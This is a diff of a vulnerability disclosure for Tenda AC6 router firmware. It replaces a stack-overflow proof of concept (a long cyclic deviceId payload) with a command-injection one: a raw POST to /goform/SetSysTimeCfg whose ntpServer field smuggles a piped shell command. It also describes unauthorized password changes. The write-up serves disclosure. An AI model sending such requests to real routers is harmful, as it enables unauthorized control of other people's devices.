@@ -1,4 +1,4 @@
-# Tenda AC6 V15.03.05.09_multi Unauthorized stack overflow vulnerability
+# Tenda AC6 V15.03.05.09_multi pre-auth Command injection vulnerability
 
 ## Overview
 
@@ -23,13 +23,11 @@ Figure 1 shows the latest firmware Ba of the router
 
 Firstly, through reverse analysis, we can find that there is a vulnerability of arbitrary password modification in the interface.The program passes the contents obtained in the loginpwd parameter directly to V16, and then directly changes the password to the login password through the setvalue() function. In this way, we can change the management password without authorization.
 
-#### 2.2Stack overflow vulnerability
+#### 2.2Command injection vulnerability
 
-![image-20220215181330985](img/image-20220215181330985.png)
+![image-20220228162806422](img/image-20220228162806422.png)
 
-![image-20220215181337519](img/image-20220215181337519.png)
-
-The content obtained by the program from the devicedid parameter is directly passed to SRC, and then the SRC is directly copied into the V17 + 2 stack through the strcpy function. There is no size check, and there is a stack overflow vulnerability.
+The program first passes the contents obtained from the ntpserver parameter to SRC, then sets the SRC value and passes the return value to V1. Finally, the program takes V1 as a parameter through the comitcfm function, which finally causes a command injection vulnerability.
 
 ## 3.Recurring vulnerabilities and POC
 
@@ -39,26 +37,28 @@ In order to reproduce the vulnerability, the following steps can be followed:
 2. Attack with the following  overflow POC attacks
 
 ```
-POST /goform/saveParentControlInfo HTTP/1.1
-Host: 192.168.2.1
+POST /goform/SetSysTimeCfg HTTP/1.1
+Host: 192.168.1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
-Content-Length: 1137
-Origin: http://192.168.2.1
+Content-Length: 69
+Origin: http://192.168.1.1
 Connection: close
-Referer: http://192.168.2.1/parental_control.html?random=0.8522110282116538&
-Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbctedcvb
+Referer: http://192.168.1.1/system_time.html?random=0.9657222523817097&
+Cookie: password=e10adc3949ba59abbe56e057f20f883effo1qw
 
-deviceId=9c%3Afc%3Ae8%3A1a%3A33%3A80aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&enable=1&time=19%3A00-21%3A00&url_enable=1&urls=123123123&day=1%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=0
+timePeriod=86400&ntpServer=time.windows.com|ls > /tmp/456&timeZone=20
 ```
 
 The reproduction results are as follows:
 
-![image-20220214114614959](img/image-20220214114614959.png)
+![image-20220228162641056](img/image-20220228162641056.png)
+
+![image-20220228162703168](img/image-20220228162703168.png)
 
 Figure 2 POC attack effect
 
